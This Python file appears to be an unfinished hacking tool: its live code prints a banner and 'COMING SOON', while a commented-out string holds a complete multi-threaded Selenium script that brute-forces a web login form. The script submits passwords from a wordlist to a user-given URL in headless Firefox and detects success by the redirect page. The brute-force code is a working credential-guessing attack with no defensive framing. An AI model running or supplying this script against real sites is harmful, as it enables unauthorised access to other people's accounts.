'''import concurrent.futures
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import banner
import colorama
import os
colorama.Back.RESET
banner.main()

URL = input(f"{colorama.Fore.YELLOW}Enter a {colorama.Fore.BLACK}{colorama.Back.BLUE}URL{colorama.Back.RESET}{colorama.Fore.YELLOW} to brute force (e.g. http://example.com): {colorama.Fore.GREEN}")
passwordField = input(f"{colorama.Fore.YELLOW}Enter {colorama.Fore.BLACK}{colorama.Back.BLUE}id of password field{colorama.Fore.YELLOW}{colorama.Back.RESET}. if you are not sure, inspect the page directly and look for it: {colorama.Fore.GREEN}")
redirect = input(f"{colorama.Fore.YELLOW}Enter a {colorama.Back.BLUE}{colorama.Fore.BLACK}redirect page(e.g https://example/dashboard){colorama.Back.RESET}{colorama.Fore.YELLOW} if not sure, look for action under form: {colorama.Fore.GREEN}")

def attempt_single_password(password):
    banner.main()
    options = webdriver.FirefoxOptions()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)
    
    colorama.Fore.BLUE
    try:
        driver.get(URL)
        password_field = driver.find_element(By.ID, passwordField)
        print(f"Attempting {colorama.Fore.RED}{password}")
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)
        
        time.sleep(1)
        
        if f"{redirect}" in driver.current_url:
            print(f"{colorama.Back.GREEN}{colorama.Fore.YELLOW}\n[!!!] MATCH FOUND: {password}")
            os.system('exit')
            return password
        return None
    finally:
        driver.quit()

def main():
    banner.main()
    wordlist = input(f"{colorama.Fore.YELLOW}Enter path to your password list(e.g /home/kali/passw.txt): {colorama.Fore.GREEN}")
    with open(wordlist, "r") as f:
        passwords = [line.strip() for line in f.readlines()]

    print(f"{colorama.Fore.BLUE}Starting multi-threaded attack on {colorama.Fore.YELLOW}{len(passwords)}{colorama.Fore.BLUE} passwords...")
    workers = int(input(f"{colorama.Fore.YELLOW}Enter number of workers to brute force for you: {colorama.Fore.GREEN}"))
    with concurrent.futures.ThreadPoolExecutor(workers) as executor:
        results = executor.map(attempt_single_password, passwords)
        
        for result in results:
            if result:
                print(f"{colorama.Fore.YELLOW}Brute force complete. Correct password: {result}")
                return

if __name__ == "__main__":
    main()
'''
from banner import main
main()
print('\nCOMING SOON')